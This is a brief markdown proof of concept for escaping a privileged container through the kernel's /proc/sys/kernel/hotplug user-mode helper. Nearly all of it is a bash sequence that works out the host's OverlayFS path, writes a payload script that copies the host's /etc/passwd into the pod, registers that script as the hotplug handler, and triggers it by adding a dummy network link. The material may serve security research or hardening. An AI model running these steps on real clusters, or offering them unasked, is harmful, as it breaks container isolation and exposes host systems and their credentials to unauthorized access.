# Container Escape via `/proc/sys/kernel/hotplug` 

> Proof-of-concept demonstrating container escape by leveraging the kernel’s hotplug user-mode helper.

---

## Environment Requirements

- Privileged pod/container

## Proof-of-Concept


```bash
# run the folliwng commands inside the pod

# Extract the OverlayFS upperdir path, which maps to a real directory on the host
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/mounts)

# Create a payload script that will be executed by the kernel
echo '#!/bin/sh' > /tmp/payload.sh

# The payload reads sensitive host information and writes it to a file inside the pod
echo "cat /etc/passwd > $host_path/output.txt" >> /tmp/payload.sh

# Make the payload executable
chmod a+x /tmp/payload.sh

# Set the kernel's hotplug handler to point to the created payload 
echo "$host_path/tmp/payload.sh" > /proc/sys/kernel/hotplug

# optional: install -y iproute2

# Trigger a hotplug event to invoke the kernel's helper (our payload)
ip link add dummy0 type dummy

```

